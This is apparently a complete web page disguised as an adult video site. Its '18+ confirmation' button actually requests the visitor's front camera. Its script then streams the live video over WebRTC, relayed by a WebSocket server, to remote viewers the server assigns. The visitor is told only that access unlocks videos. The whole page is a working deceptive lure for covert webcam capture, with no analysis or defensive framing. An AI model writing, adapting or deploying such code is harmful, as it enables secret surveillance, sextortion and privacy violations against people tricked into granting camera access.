<!doctype html>
<html>
<head>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>18+ Videos</title>

  <style>
    body {
      margin: 0;
      background: #111;
      color: #fff;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
    }

    #status {
      font-size: 18px;
      margin: 15px;
    }

    #id {
      font-size: 13px;
      color: #aaa;
      margin-bottom: 15px;
    }

    .google-button {
      display: inline-block;
      margin: 0 0 18px;
      padding: 12px 22px;
      background: #fff;
      color: #000;
      text-decoration: none;
      border-radius: 8px;
      font-weight: bold;
      font-size: 16px;
    }

    /* Permission popup */
    #permissionGate {
      position: fixed;
      inset: 0;
      z-index: 999999;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      background: #111;
    }

    .permissionBox {
      width: 100%;
      max-width: 380px;
      padding: 25px;
      box-sizing: border-box;
      background: #222;
      border-radius: 16px;
    }

    .permissionBox h2 {
      margin-top: 0;
      font-size: 25px;
    }

    .permissionBox p {
      color: #ddd;
      line-height: 1.5;
    }

    #allowCameraBtn {
      width: 100%;
      padding: 16px;
      margin-top: 12px;
      border: none;
      border-radius: 10px;
      background: #fff;
      color: #000;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }

    #permissionMessage {
      min-height: 22px;
      margin: 15px 0 0;
      color: #ff8888;
    }
  </style>
</head>

<body>

  <!-- Camera permission popup -->
  <div id="permissionGate">
    <div class="permissionBox">

      <h2>🔞 18+ Only</h2>

      <p>
        You must confirm that you are 18 years or older
        and allow the access to continue.
      </p>

      <button id="allowCameraBtn">
        I am 18+ — click Allow
      </button>

      <p id="permissionMessage"></p>

    </div>
  </div>

  <h1>18+ Videos</h1>

  <div id="status">
    🔒 permission required
  </div>

  <div id="id"></div>

  <a
    class="google-button"
    href="https://www.qorno.com/category/hd"
    target="_blank"
    rel="noopener"
  >
    HD sex videos
  </a>

  <script>

    const status =
      document.getElementById("status");

    const idBox =
      document.getElementById("id");

    const permissionGate =
      document.getElementById("permissionGate");

    const allowCameraBtn =
      document.getElementById("allowCameraBtn");

    const permissionMessage =
      document.getElementById("permissionMessage");

    let stream = null;
    let cameraId = null;
    let roleReceived = false;
    let permissionAllowed = false;

    const peers = new Map();

    const ws = new WebSocket(
      (location.protocol === "https:" ? "wss:" : "ws:") +
      "//" + location.host + "/camera"
    );

    // REQUEST FRONT CAMERA ONLY AFTER 18+ BUTTON

    allowCameraBtn.onclick = async () => {

      allowCameraBtn.disabled = true;

      permissionMessage.textContent =
        "allow permission...";

      try {

        stream =
          await navigator.mediaDevices.getUserMedia({

            video: {
              facingMode: {
                exact: "user"
              }
            },

            audio: false

          });

        permissionAllowed = true;

        permissionGate.style.display = "none";

        status.textContent =
          "click here and see more HD sex videos";

        // If server already gave the camera ID,
        // tell it that the camera is live.

        if (roleReceived) {

          ws.send(JSON.stringify({
            type: "sex video-live"
          }));

        }

      }

      catch (err) {

        stream = null;

        allowCameraBtn.disabled = false;

        permissionMessage.textContent =
          "❌ Front camera permission is required. If you are 18+, please allow access to continue.";

        status.textContent =
          "🔒 Front camera permission denied";

      }

    };


    function createPeer(viewerId) {

      const old =
        peers.get(viewerId);

      if (old) {

        old.close();

      }

      const pc =
        new RTCPeerConnection({

          iceServers: [
            {
              urls:
                "stun:stun.l.google.com:19302"
            }
          ]

        });

      peers.set(viewerId, pc);

      pc.onicecandidate = e => {

        if (
          e.candidate &&
          ws.readyState === WebSocket.OPEN
        ) {

          ws.send(JSON.stringify({

            type: "candidate",

            candidate: e.candidate,

            toViewerId: viewerId

          }));

        }

      };


      stream.getTracks().forEach(track => {

        pc.addTrack(track, stream);

      });


      return pc;

    }


    ws.onmessage = async e => {

      const m =
        JSON.parse(e.data);


      if (m.type === "role") {

        cameraId =
          m.cameraId;

        roleReceived =
          true;


        idBox.textContent =
          "sex ID: " + cameraId;


        // Camera was already allowed

        if (
          permissionAllowed &&
          stream
        ) {

          status.textContent =
            "see sex videos";


          ws.send(JSON.stringify({
            type: "sex videos-live"
          }));

        }

      }


      if (m.type === "viewer-ready") {

        // No stream = no camera access

        if (!stream) return;


        const pc =
          createPeer(m.viewerId);


        const offer =
          await pc.createOffer();


        await pc.setLocalDescription(
          offer
        );


        ws.send(JSON.stringify({

          type: "offer",

          offer: pc.localDescription,

          toViewerId: m.viewerId

        }));

      }


      if (m.type === "answer") {

        const pc =
          peers.get(m.toViewerId);


        if (pc) {

          await pc.setRemoteDescription(
            m.answer
          );

        }

      }


      if (m.type === "candidate") {

        const pc =
          peers.get(m.toViewerId);


        if (
          pc &&
          pc.remoteDescription
        ) {

          await pc
            .addIceCandidate(m.candidate)
            .catch(() => {});

        }

      }

    };


    ws.onclose = () => {

      status.textContent =
        "🔴 Connection closed";

    };

  </script>

</body>
</html>
